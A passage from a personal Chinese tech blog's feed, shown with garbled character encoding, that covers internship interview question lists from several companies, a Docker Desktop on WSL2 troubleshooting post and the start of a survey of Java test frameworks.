çš„ä»€ä¹ˆ</li><li>ä¸ºä»€ä¹ˆæ¥è‹±ç‰¹å°”</li><li>åé—®</li><li>ä¸ºä»€ä¹ˆæƒ³è¦ transfer</li><li>åˆ·é¢˜æ˜¯ä¸ºäº†å¹²å˜›</li></ol><p>6.2 æ”¶åˆ° Intern çš„ç¬”è¯•é€šçŸ¥ï¼ˆçœ‹äº†ä¸‹è®°å½•æ˜¯ 4.16 æŠ•é€’çš„ï¼Œè¦æ±‚ä½¿ç”¨è…¾è®¯ä¼šè®®ç¬”è¯•ï¼Œå¹¶å°†ç­”æ¡ˆæ‹ç…§å‘é‚®ä»¶ï¼‰ï¼Œç„¶å 6.11 æ‰æƒ³èµ·æ¥è¿™æ˜¯ 6.8 çš„ç¬”è¯•ï¼Œwhatever</p><h2 id="ç¾å›¢"><a href="#ç¾å›¢" class="headerlink" title="ç¾å›¢"></a>ç¾å›¢</h2><p>å½“æ—¶å¯¹ Java è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œç¡¬ç”Ÿç”Ÿé¢äº†ä¸€ä¸ªå°æ—¶ã€‚å…ˆæ˜¯ç¾å›¢é…é€ä¸¤è½®é¢è¯•ï¼Œç„¶åç«‹é©¬è¢«å¦ä¸€ä¸ªå¾®ä¿¡å°ç¨‹åºçš„å›¢é˜Ÿæèµ·ä¸€é¢ï¼Œä¹Ÿæ²¡æœ‰åç»­äº†ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>Java æŠ€æœ¯æ ˆï¼ˆä¸åŒ¹é…ï¼Œé—®ç‚¹åˆ«çš„ï¼‰</li><li>æ•°æ®åº“<ul><li>ACID å±æ€§</li><li>ä¸¾ä¸ªä¾‹å­ï¼Œéƒ½å¯¹åº”å“ªäº›å±æ€§</li></ul></li><li>è®¡ç®—æœºç½‘ç»œ<ul><li>TCP å’Œ UDP çš„åŒºåˆ«</li><li>TCP ç›¸å…³æœºåˆ¶ï¼šç¡®è®¤ã€é‡ä¼ ã€æ‹¥å¡æ§åˆ¶</li></ul></li><li>æ“ä½œç³»ç»Ÿ<ul><li>è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«</li></ul></li><li>æƒ…å¢ƒæè¿°<ul><li>å¦‚ä½•è®¾è®¡å¥½ä¸€ä¸ªæ¥å£</li><li>è¯·æ±‚è°ƒç”¨éå¸¸æ…¢ï¼Œå¦‚ä½•æ’æŸ¥&#x2F;ä¼˜åŒ–</li><li>é¡¹ç›®ä¸­é‡åˆ°çš„éš¾é¢˜ä¸è§£å†³ï¼Œå†æ¬¡é‡åˆ°æ˜¯å¦ä¼šåŠ å¿«å¤„ç†é€Ÿåº¦</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®<ul><li>åŒºå—é“¾<ul><li>ç”¨æ¥åšä»€ä¹ˆ</li><li>ç”¨ä»€ä¹ˆæœºåˆ¶ï¼Œå·¥ä½œé‡è¯æ˜ï¼Ÿ</li><li>ä¸»è¦è´Ÿè´£ä»€ä¹ˆå†…å®¹</li><li>å¦‚ä½•æ‹¿åˆ° OTPï¼ˆèŠ‚ç‚¹å…¥ç½‘ï¼‰</li><li>å•å‘ TLS æ˜¯ä»€ä¹ˆ</li><li>CA çš„ä½œç”¨</li></ul></li><li>é“¾è·¯è¿½è¸ª<ul><li>ä»‹ç»</li><li>è¿½è¸ªæ•°æ®å¦‚ä½•ä¼ é€’<ul><li>è¿›ç¨‹-çº¿ç¨‹-å…ƒæ•°æ®</li></ul></li><li>ES ä½¿ç”¨å“ªç§åˆ†é¡µ</li><li>å¤šæœºéƒ¨ç½²å¦‚æœæœ‰å°ä¸»æœºæŒ‚äº†æ€ä¹ˆåŠï¼Œè¿½è¸ªé“¾è·¯æ–­å¼€ï¼Ÿ</li><li>å¦‚ä½•ä¿è¯æ€§èƒ½</li></ul></li></ul></li><li>å¯¹ä»€ä¹ˆè¯­è¨€æ¯”è¾ƒç†Ÿ<ul><li>Python åº•å±‚çš„åƒåœ¾å›æ”¶æœºåˆ¶</li></ul></li><li>ç”¨è¿‡å“ªäº›æ•°æ®åº“ï¼Œäº†è§£åˆ°ä»€ä¹ˆåœ°æ­¥</li><li>MySQL æ•°æ®åº“éš”ç¦»çº§åˆ«ï¼Œåˆ†åˆ«è§£å†³å“ªäº›é—®é¢˜</li><li>å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†çš„åŒºåˆ«</li><li>TLS å¦‚ä½•å»ºç«‹è¿æ¥ï¼ˆå•å‘ã€åŒå‘ï¼‰ï¼Œå¯¹ç§°å¯†é’¥ï¼Ÿéå¯¹ç§°å¯†é’¥ï¼Ÿ</li><li>å¦‚ä½•éªŒè¯è¯ä¹¦é“¾</li><li>ç®—æ³•<ul><li>äºŒå‰æ ‘ä¸Šè§†å›¾</li></ul></li></ol><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®ç›¸å…³<ul><li>CA æ¶æ„</li><li>é“¾è·¯è¿½è¸ªå¦‚ä½•å®ç°ï¼Œè´Ÿè´£å“ªäº›éƒ¨åˆ†</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿå¦‚ä½•å®ç°</li><li>é‡åˆ°çš„é—®é¢˜ä¸è§£å†³</li><li>ES ç›¸å…³é—®é¢˜</li></ul></li><li>æ•°æ®åº“<ul><li>éš”ç¦»çº§åˆ«</li><li>å¹¶å‘é”™è¯¯</li><li>MVCC</li><li>å¦‚ä½•é¢„é˜²å¹»è¯»</li><li>ç´¢å¼•ç±»å‹</li><li>ç´¢å¼•åº•å±‚å®ç°</li><li>ç´¢å¼•ä¼˜ç¼ºç‚¹</li><li>é”</li></ul></li><li>è®¡ç®—æœºç½‘ç»œ<ul><li>åè®®å¯¹åº”å“ªå±‚ï¼ˆHTTPã€TCPï¼‰</li><li>TCP ä¸ UDP</li><li>TCP å¦‚ä½•ç¡®ä¿å¯é </li><li>TCP å…¶ä»–æœºåˆ¶ï¼ˆæµé‡æ§åˆ¶ã€æ‹¥å¡æ§åˆ¶ï¼‰</li><li>HTTP ä¸ HTTPS</li></ul></li><li>Java æ•°æ®ç±»å‹</li><li>å­—å…¸å’Œé›†åˆçš„åŒºåˆ«ä¸å®ç°</li><li>10 äº¿æ•°æ®æœç´¢ top10 å¦‚ä½•å®ç°<ul><li>å›ç­”å †ï¼Œå †çš„åº•å±‚å®ç°</li></ul></li><li>çœ‹æºç æ—¶æ³¨æ„ä»€ä¹ˆï¼Œæ˜¯å¦å­¦ä¹ å†™æ³•</li><li>ç®—æ³•<ul><li>æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²</li></ul></li></ol><h2 id="ç™¾åº¦"><a href="#ç™¾åº¦" class="headerlink" title="ç™¾åº¦"></a>ç™¾åº¦</h2><p>é¢æˆ‘çš„å›¢é˜Ÿåªè¦ä¼š C++ çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ä¸‰è¿é¢ï¼Œç›´æ¥ä¸€é¢æŒ‚ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®ä¸­é‡åˆ°çš„éš¾ç‚¹</li><li>è¿›ç¨‹çº¿ç¨‹åŒºåˆ«</li><li>é”ï¼ˆäº’æ–¥ã€å…±äº«ï¼‰</li><li>TCP åœ¨å“ªä¸€å±‚</li><li>Linux æŸ¥çœ‹æ–‡æœ¬çš„æ“ä½œ</li><li>shell å¦‚ä½•è¿è¡ŒæŒ‡ä»¤</li><li>åšè¿‡å¤šçº¿ç¨‹ç¼–ç¨‹å—</li><li>ç®—æ³•<ul><li>åˆå¹¶ä¸¤ä¸ªæœ‰åºæ•°ç»„</li><li>å®ç°æ‹·è´å‡½æ•° <code>char* memcopy(char* source, char* dest, int n)</code> è€ƒè™‘åœ°å€é‡å çš„æƒ…å†µ</li></ul></li></ol><h2 id="ç‰¹æ–¯æ‹‰"><a href="#ç‰¹æ–¯æ‹‰" class="headerlink" title="ç‰¹æ–¯æ‹‰"></a>ç‰¹æ–¯æ‹‰</h2><p>é¢è¯•å¾ˆæ°´ï¼Œä¸‰é¢ä½“éªŒæå·®ï¼Œ9 åˆ†é’Ÿçš„é¢è¯•çœŸæ˜¯è®©æˆ‘å¼€äº†çœ¼äº†ã€‚é—®æƒ³ç•™åœ¨ç‰¹æ–¯æ‹‰è¿˜æ˜¯ç§¯ç´¯ç»éªŒï¼Œå°±ä¸è¯¥<strong>è¯šå®</strong>å›ç­”ç§¯ç´¯ç»éªŒï¼Œè‹±æ–‡é—®é¢˜å¾ˆçªç„¶ï¼Œæ—¢ç„¶æ˜¯é‡ç‚¹è€ƒå¯Ÿå†…å®¹å°±è¯¥æ”¾åœ¨ä¸€é¢â€¦â€¦</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é“¾è·¯è¿½è¸ª<ul><li>å¯¹äº‘å¹³å°è¿˜æ˜¯å¯¹äº‘å¹³å°ä¹‹ä¸Šçš„è½¯ä»¶è¿½è¸ª</li><li>å„ä¸ªç»„ä»¶çš„ä½œç”¨</li><li>åˆ›å»ºè™šæ‹Ÿæœºçš„ç»„ä»¶äº¤äº’</li><li>è¿½è¸ªçš„æ•°æ®æ˜¯ä»€ä¹ˆ</li><li>èƒ½ç”¨æ¥åšä»€ä¹ˆï¼Œæ˜¯å¦åšè¿‡å®é™…çš„æ€§èƒ½è°ƒä¼˜ï¼Œç“¶é¢ˆæ£€æŸ¥</li><li>è™šæ‹Ÿæœºç½‘ç»œå’Œä¸»æœºç½‘ç»œçš„åŒºåˆ«</li><li>é‡åˆ°çš„å›°éš¾ä¸è§£å†³</li><li>è®²ä¸€ä¸‹ Kolla-Ansible</li></ul></li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿ<ul><li>ç®€å•ä»‹ç»</li></ul></li><li>åŒºå—é“¾<ul><li>è´Ÿè´£å“ªäº›å†…å®¹</li><li>å®¹å™¨åŒ–</li></ul></li><li>å¯¹ Devops çš„ç†è§£</li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®ç›¸å…³å†…å®¹</li><li>å…¬æœ‰äº‘ç§æœ‰äº‘çš„è¿ç»´æ„¿æ„åšå“ªä¸ªï¼ˆAWSã€AZureï¼‰</li><li>ä¸ºä»€ä¹ˆé€‰æ‹©ç‰¹æ–¯æ‹‰è¿™ä¸ªè½¦ä¼</li><li>æ¥è§¦çš„ç¼–ç¨‹è¯­è¨€ä¸­è§‰å¾—å“ªä¸ªæœ€å¥½</li></ol><p><strong>ä¸‰é¢</strong></p><ol><li>åšè¿‡å“ªäº›å’Œå²—ä½ç›¸å…³çš„å·¥ä½œå†…å®¹</li><li>å¯¹ CI&#x2F;CD çš„ç†è§£</li><li>æ¥è§¦è¿‡ jerkinsã€prometheusã€grafana ä¹‹ç±»çš„å—</li><li>é¡¹ç›®ä¸­é‡åˆ°çš„å›°éš¾ä¸è§£å†³</li><li>æœ‰æ„æ„¿ç•™åœ¨ç‰¹æ–¯æ‹‰å—ï¼Œè¿˜æ˜¯æ¥ç§¯ç´¯ç»éªŒ</li><li>è‹±æ–‡<ul><li>Why Telsa</li><li>Benefit of microservice</li></ul></li></ol><h2 id="è”æƒ³"><a href="#è”æƒ³" class="headerlink" title="è”æƒ³"></a>è”æƒ³</h2><p>å®‰å…¨å®éªŒå®¤ï¼Œä¸€é¢æœ‰ä¸‰äº”ä¸ªé¢è¯•å®˜ï¼Œä¸€é¢è¿‡äº†å°±æ‹¿åˆ° offer äº†ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿ<ul><li>å…·ä½“æ˜¯æ€ä¹ˆåšçš„</li><li>èƒ½å¤Ÿæ£€æµ‹ä»€ä¹ˆ</li><li>å¦‚ä½•æŠ½è±¡</li><li>é™æ€åˆ†ææ˜¯åšä»€ä¹ˆï¼Œæ±¡ç‚¹è¿½è¸ª</li><li>ä»‹ç»ä¸€ä¸‹ Soot æ¡†æ¶</li></ul></li><li>åŒºå—é“¾ä¸­è´Ÿè´£å“ªäº›å†…å®¹</li><li>æ¥è§¦è¿‡ä¸€äº›é€†å‘çš„ä¸œè¥¿å—ï¼ˆWinDbgã€IDAï¼‰</li></ol><h2 id="FreeWheel"><a href="#FreeWheel" class="headerlink" title="FreeWheel"></a>FreeWheel</h2><p>åœ¨çœ‹èµ·æ¥å¾ˆåƒç›—ç‰ˆç½‘ç«™çš„å®˜ç½‘æŠ•é€’ï¼Œæ²¡æ³•æŸ¥è¯¢æŠ•é€’è®°å½•ï¼Œç¬”è¯•æ—¶é€‰æ‹©éƒ¨é—¨æ„å‘ã€‚äºŒé¢çš„é¢è¯•å®˜ä¸ä¼šç®—æ³•çš„æ ·å­ï¼Œé—®æ€è·¯å°±æ˜¯ä¸çŸ¥é“ï¼Œåé—®æˆ‘è¦ä¸æ¢é“é¢˜â€¦â€¦</p><p><strong>ä¸€é¢</strong></p><ol><li>è¿›ç¨‹ä¸çº¿ç¨‹</li><li>ä¸ºä»€ä¹ˆè¦çº¿ç¨‹ï¼ˆåˆ†é¡µï¼‰</li><li>ä»€ä¹ˆå«æ— çŠ¶æ€</li><li>HTTP 1.0ã€2.0 åŒºåˆ«</li><li>HTTP Method</li><li>HTTP å¦‚ä½•ä¿æŒè¿æ¥</li><li>POST å’Œ GET åŒºåˆ«</li><li>Session å’Œ Cookie</li><li>ACIDã€éš”ç¦»çº§åˆ«ã€å¹¶å‘ä¸€è‡´æ€§é—®é¢˜</li><li>MySQL å¼•æ“ä¸åŒºåˆ«</li><li>ç®—æ³•<ul><li>åˆ¤æ–­å›¾æ˜¯å¦è¿é€š</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>é¡¹ç›®ä¸­é‡åˆ°çš„é—®é¢˜ä¸è§£å†³</li><li>HTTP æ˜¯æ— çŠ¶æ€çš„å—ï¼Œå¦‚ä½•å˜æˆæœ‰çŠ¶æ€</li><li>ç”¨è¿‡å“ªäº› python æ¡†æ¶ã€java æ¡†æ¶</li><li>ç”¨è¿‡å“ªäº›æ•°æ®åº“</li><li>MySQL ç´¢å¼•éƒ½æœ‰å“ªäº›</li><li>ç®—æ³•<ul><li>å­åºåˆ—</li><li>ç¼–è¾‘è·ç¦»</li></ul></li></ol><h2 id="å­—èŠ‚è·³åŠ¨"><a href="#å­—èŠ‚è·³åŠ¨" class="headerlink" title="å­—èŠ‚è·³åŠ¨"></a>å­—èŠ‚è·³åŠ¨</h2><p>ä¸€é¢è€ƒå¯Ÿæ¯”è¾ƒå…¨é¢ï¼Œé¡¹ç›®å…«è‚¡ç®—æ³•ï¼›äºŒé¢ä½“éªŒæå·®ï¼Œç®—æ³•ä¸ä¼šå°±æ¢é¢˜ï¼Œæé—®æ²¡æœ‰åé¦ˆæ²¡æœ‰ hintï¼Œéè¦å†™<strong>é“¾è¡¨å¿«æ’</strong>ï¼Œä½“éªŒå°±åƒæ˜¯é¢å¯¹ä¸€ä¸ªéšæœºå‡ºé¢˜çš„é¢˜åº“ï¼Œå‰©ä½™æ—¶é—´è®©æˆ‘ä»‹ç»ä¸€ä¸‹é¡¹ç›®ã€‚çœ‹æ¥å­—èŠ‚é¢è¯•çœŸçš„çœ‹è¿æ°”ï¼Œé‡åˆ°è¿™ç§â€¦â€¦æˆ‘å½“æ—¶å°±è¯¥é—®é¢è¯•å®˜ä¼šä¸ä¼šå†™ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿæ˜¯æ€æ ·çš„ï¼Œåšåˆ°å“ªé‡Œäº†</li><li>goã€pythonã€java ä¹‹é—´çš„åŒºåˆ«&#x2F;ç‰¹æ€§</li><li>ç”¨è¿‡å“ªäº›æ•°æ®åº“ï¼ŒåŒºåˆ«å’Œå„è‡ªçš„ä½¿ç”¨åœºæ™¯</li><li>æ•°æ®åº“éš”ç¦»çº§åˆ«éƒ½è§£å†³å“ªäº›å¹¶å‘é”™è¯¯ã€å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶</li><li>HTTP Method<ul><li>ä½œç”¨</li><li>å®‰å…¨æ€§</li><li>å¹‚ç­‰</li><li>æ¯”è¾ƒ GET å’Œ POST</li></ul></li><li>HTTP ä¸ HTTPS<ul><li>å¦‚ä½•å»ºç«‹ TLS</li><li>å®‰å…¨éšæ‚£ï¼šä¸­é—´äººæ”»å‡»ï¼Œå±•å¼€ï¼Œå¦‚ä½•ä¼ªè£…ä¸­é—´äºº</li></ul></li><li>æ•°æ®åº“éš”ç¦»çº§åˆ«ã€å¹¶å‘é”™è¯¯ã€å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶</li><li>ç´¢å¼•<ul><li>å¯¹ä»€ä¹ˆåˆ—å»ºç«‹ç´¢å¼•</li><li>ç´¢å¼•ç±»å‹</li><li>ç´¢å¼•çš„ä¼˜ç¼ºç‚¹</li></ul></li><li>ç®—æ³•<ul><li>æ£‹ç›˜é—®é¢˜ï¼Œä¸‹æ£‹ï¼ˆå…¨æ”¾æ»¡ï¼‰ï¼Œè°çš„è¿é€šå—é¢ç§¯æœ€å¤§å°±èµ¢äº†</li><li>æ‰©å±•ï¼Œå¦‚æœç®—æ­£æ–¹å½¢é¢ç§¯å‘¢</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä¸‰æ¬¡æ¡æ‰‹</li><li>å››æ¬¡æŒ¥æ‰‹</li><li>çŠ¶æ€</li><li>çº¿ç¨‹ç‹¬å èµ„æº</li><li>çº¿ç¨‹æŒ‚æ‰å½±å“è¿›ç¨‹å—</li><li>MySQL ç´¢å¼•å®ç°æ–¹å¼</li><li>ä¸ºä»€ä¹ˆç”¨ B+ æ ‘</li><li>HTTP 1.0ã€2.0ã€3.0</li><li>ç®—æ³•<ul><li>è¯»å†™è€…</li><li>å›¾åˆ¤ç¯</li><li>é“¾è¡¨å¿«æ’</li></ul></li><li>é“¾è·¯è¿½è¸ªå¦‚ä½•å®ç°</li></ol><h2 id="è…¾è®¯"><a href="#è…¾è®¯" class="headerlink" title="è…¾è®¯"></a>è…¾è®¯</h2><p>æŠ•é€’çš„æ—¶å€™å·²ç»é”™è¿‡äº†ç¬”è¯•æ—¶é—´ï¼Œæ‰€ä»¥æ¥åˆ°é¢è¯•é€šçŸ¥è¿˜æ˜¯å¾ˆæƒŠè®¶çš„ï¼Œå¥½åƒæ˜¯è…¾è®¯äº‘çš„åŒ—äº¬å›¢é˜Ÿï¼Œåšæ··æ²Œå·¥ç¨‹çš„ï¼Œé¢è¯•å®˜åº”è¯¥æ˜¯åš research çš„ï¼Œè¿˜é—®æˆ‘å‘è¡¨è®ºæ–‡ä¸å¦ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®ç›¸å…³<ul><li>Java åˆ†æç³»ç»Ÿä¸ç°æœ‰åˆ†æå·¥å…·çš„åŒºåˆ«ï¼›å¤ç°çš„è®ºæ–‡æ˜¯ä»€ä¹ˆä¼šè®®ï¼Œæ•ˆæœå¦‚ä½•ï¼›ç™½ç›’è‡ªåŠ¨åŒ–</li><li>é“¾è·¯è¿½è¸ªç³»ç»Ÿæ•´ä½“ä»‹ç»ï¼Œéš¾é¢˜ä¸è§£å†³ï¼›äº†è§£å…¶ä»–é“¾è·¯è¿½è¸ªå·¥å…·å—ï¼›å¦‚ä½•æµ‹è¯•ï¼Œæ€§èƒ½å½±å“ï¼›ç»™æ¼æ´æŒ–æ˜è¾…åŠ©</li><li>é¡¹ç›®æ˜¯å¦æœ‰å‘è®ºæ–‡</li><li>ç¼–ç¨‹è¯­è¨€ï¼ˆgoã€pythonã€java éƒ½æ¥è§¦è¿‡ï¼‰</li><li>Docker å¦‚ä½•é€‰æ‹©åŸºç¡€é•œåƒï¼Œå‡å°å®¹å™¨ä½“ç§¯</li><li>æœ‰å†™è¿‡å•å…ƒæµ‹è¯•å—ï¼Œè€ƒè™‘ä»£ç è´¨é‡å—</li></ul></li><li>ç®—æ³•<ul><li>æ»‘åŠ¨çª—å£æœ€å¤§å€¼</li></ul></li></ol><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å®é™…ä¸Šæˆ‘æŠ•é€’äº†æœ‰ 30+ å…¬å¸ï¼ŒåŸºæœ¬éƒ½æ²¡æœ‰å†…æ¨ï¼Œæœ‰äº›ç›´æ¥æŒ‚æ‰äº†ç®€å†ï¼Œæœ‰äº›è‡³ä»Šæ²¡æœ‰æ¶ˆæ¯ï¼Œç›¸å¯¹æ¥è¯´æˆ‘æŠ•é€’å¾—è¿˜æ˜¯æ¯”è¾ƒæ™šçš„ã€‚ä¸ºäº†èƒ½å¤Ÿæ‹¿åˆ° offer è€Œåå¤é˜…è¯»å’Œåˆ·é¢˜çœŸçš„æŒºæ¶ˆç£¨å¿ƒæ™ºçš„â€¦â€¦ï¼Œæƒ³å­¦çš„ä¸œè¥¿ä¸å¾—ä¸å»¶åï¼Œæœ€å¥½çš„æƒ…å†µæ˜¯å·¥ä½œå’Œè‡ªå·±çš„å…´è¶£æ°å¥½æœ‰äº¤å‰ï¼ˆä¸ªäººçœ‹æ³•ï¼‰ï¼Œ23 å±ŠåŠ æ²¹ï¼</p>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Notes/">Notes</category>
      
      
      
      <comments>https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Docker Desktop stopped é—®é¢˜è§£å†³</title>
      <link>https://jckling.github.io/2022/05/05/Other/Docker%20Desktop%20stopped%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</link>
      <guid>https://jckling.github.io/2022/05/05/Other/Docker%20Desktop%20stopped%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/</guid>
      <pubDate>Thu, 05 May 2022 02:46:40 GMT</pubDate>
      
      <description>Docker Desktop 4.7.1</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p>æœ€è¿‘å¼€å§‹ä½¿ç”¨ WSL2 + Docker Desktop (4.7.1)ï¼Œæœ‰æ®µæ—¶é—´ç”¨é›·ç”µæ¨¡æ‹Ÿå™¨ç©æ‰‹æ¸¸ï¼ˆå’Œ Docker å†²çªï¼‰ï¼Œç°åœ¨åˆè¦ç”¨ Dockerï¼Œå¹²è„†æŠŠæ¨¡æ‹Ÿå™¨å¸è½½äº†ï¼Œä½† Docker ä»ç„¶ä¸å¯ç”¨ã€‚</p><p>æ¯æ¬¡æ‰“å¼€éƒ½æ˜¯ <code>Docker Desktop stopped</code>ï¼Œå¹¶å¼¹çª—æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error during connect: In the default daemon configuration on Windows, the docker client must be run with elevated privileges to connect.: Get &quot;http://%2F%2F.%2Fpipe%2Fdocker_engine/v1.24/containers/json&quot;: open //./pipe/docker_engine: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h2 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h2><p>ç»è¿‡ä»¥ä¸‹æ­¥éª¤è§£å†³ï¼Œä¸è¿‡ä¹Ÿå¯èƒ½åªéœ€è¦æ‰§è¡Œéƒ¨åˆ†æ“ä½œã€‚</p><ol><li><p>é‡ç½®ç½‘ç»œç¼–ç¨‹æ¥å£</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh winsock reset</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ cmd åˆ‡æ¢ Linux æˆ– Windows å®¹å™¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\Docker\Docker\DockerCli.exe&quot; -SwitchDaemon</span><br></pre></td></tr></table></figure></li><li><p>å…³é—­å†æ‰“å¼€ â€œé€‚ç”¨äº Linux çš„ Windows å­ç³»ç»Ÿâ€</p><p> éœ€è¦é‡å¯</p></li><li><p>é‡è£… Ubuntu</p><p> åœ¨åº”ç”¨å•†åº—é‡Œæ“ä½œå³å¯</p></li><li><p>é‡è£… Docker Desktop</p><p> ç»è¿‡ä¸Šé¢çš„ä¸€ç³»åˆ—æŠ˜è…¾å‘ç°ä¸å¼¹çª—æŠ¥é”™ï¼Œä½†ä»ç„¶æ˜¯åœæ­¢çš„çŠ¶æ€ã€‚é‡è£… Docker Desktop ä¹‹åå¯ä»¥ç”¨äº†â€¦â€¦</p></li></ol><h2 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h2><ul><li><a href="https://github.com/docker/for-win/issues/1825">error during connect: Get http:&#x2F;&#x2F;%2F%2F.%2Fpipe%2Fdocker_engine&#x2F;v1.35&#x2F;info: open &#x2F;&#x2F;.&#x2F;pipe&#x2F;docker_engine: The system cannot find the file specified. In the default daemon configuration on Windows, the docker client must be run elevated to connect. This error may also indicate that the docker daemon is not running. #1825</a></li><li><a href="https://stackoverflow.com/questions/67406780/not-able-to-start-docker-desktop-in-windows">Not able to start docker Desktop in Windows</a></li><li><a href="https://forums.docker.com/t/solved-docker-failed-to-start-docker-desktop-for-windows/106976">[SOLVED] Docker Failed to Start - Docker Desktop for Windows</a></li><li><a href="https://github.com/docker/for-win/issues/10958">Docker Desktop fails to start&#x2F;run on Windows startup #10958</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Other/">Other</category>
      
      
      <category domain="https://jckling.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://jckling.github.io/tags/Docker/">Docker</category>
      
      <category domain="https://jckling.github.io/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/">é—®é¢˜è§£å†³</category>
      
      
      <comments>https://jckling.github.io/2022/05/05/Other/Docker%20Desktop%20stopped%20%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Java è‡ªåŠ¨å•å…ƒæµ‹è¯•ç”Ÿæˆæ¡†æ¶</title>
      <link>https://jckling.github.io/2022/04/27/Other/Java%20%E8%87%AA%E5%8A%A8%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6/</link>
      <guid>https://jckling.github.io/2022/04/27/Other/Java%20%E8%87%AA%E5%8A%A8%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6/</guid>
      <pubDate>Wed, 27 Apr 2022 02:09:06 GMT</pubDate>
      
      <description>è°ƒç ” Java å¼€æºæµ‹è¯•æ¡†æ¶ï¼Œä¸Šæ‰‹ä½¿ç”¨ Randoop ä¸ EvoSuite</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="æµ‹è¯•æ¡†æ¶"><a href="#æµ‹è¯•æ¡†æ¶" class="headerlink" title="æµ‹è¯•æ¡†æ¶"></a>æµ‹è¯•æ¡†æ¶</h1><ul><li>BDD(Behaviour-Driven Development)ï¼šè¡Œä¸ºé©±åŠ¨å¼€å‘</li><li>TDD(Test-Driven Development)ï¼šæµ‹è¯•é©±åŠ¨å¼€å‘</li></ul><table><thead><tr><th>æ¡†æ¶</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><a href="https://github.com/junit-team/junit5/">JUnit</a></td><td>TDD</td><td>æœ€åŸºæœ¬çš„æµ‹è¯•æ¡†æ¶ï¼Œå¯ä»¥ä¸ Selenium ä¸€åŒä½¿ç”¨</td></tr><tr><td>JBehave</td><td>BDD</td><td>ä¸»è¦ä¸ Selenium WebDriver ä¸€èµ·ä½¿ç”¨</td></tr><tr><td>Serenity</td><td>BDD</td><td>å¯ä»¥ä¸ JBehaveã€JUnit é›†æˆ</td></tr><tr><td>TestNG</td><td>TDD</td><td>ä¸»è¦ä½¿ç”¨ XML é…ç½®ï¼Œé›†æˆç«¯åˆ°ç«¯æµ‹è¯•</td></tr><tr><td>Mockito</td><td>TDD</td><td>é€šè¿‡åå°„æ¨¡æ‹Ÿå¯¹è±¡ï¼Œå¯ä»¥ä¸ TestNGã€JUnit é›†æˆ</td></tr><tr><td>HttpUnit</td><td>BDD</td><td>åŸºäº JUnit å¼€å‘ï¼Œç½‘ç«™æµ‹è¯•</td></tr><tr><td>JWebUnit</td><td>BDD</td><td>ç½‘ç«™æµ‹è¯•</td></tr><tr><td><a href="https://github.com/getgauge/gauge">Gauge</a></td><td>BDD</td><td>ç½‘ç«™æµ‹è¯•</td></tr><tr><td>Geb</td><td>BDD</td><td>ç½‘ç«™æµ‹è¯•</td></tr><tr><td><a 